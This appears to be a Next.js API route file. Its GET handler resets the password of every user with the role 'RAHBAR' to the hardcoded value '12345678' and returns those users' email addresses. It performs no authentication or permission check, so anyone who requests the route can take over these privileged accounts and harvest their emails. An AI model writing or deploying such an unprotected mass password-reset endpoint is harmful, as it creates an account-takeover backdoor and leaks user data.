import { NextResponse } from "next/server";
import dbConnect from "@/lib/mongodb";
import { User } from "@/models/User";
import bcrypt from "bcryptjs";

export const dynamic = 'force-dynamic';

export async function GET(req: Request) {
  try {
    await dbConnect();
    const hash = await bcrypt.hash("12345678", 12);
    const result = await User.updateMany({ role: "RAHBAR" }, { $set: { password: hash } });
    
    const users = await User.find({ role: "RAHBAR" }, { email: 1 });
    
    return NextResponse.json({ success: true, modified: result.modifiedCount, users });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
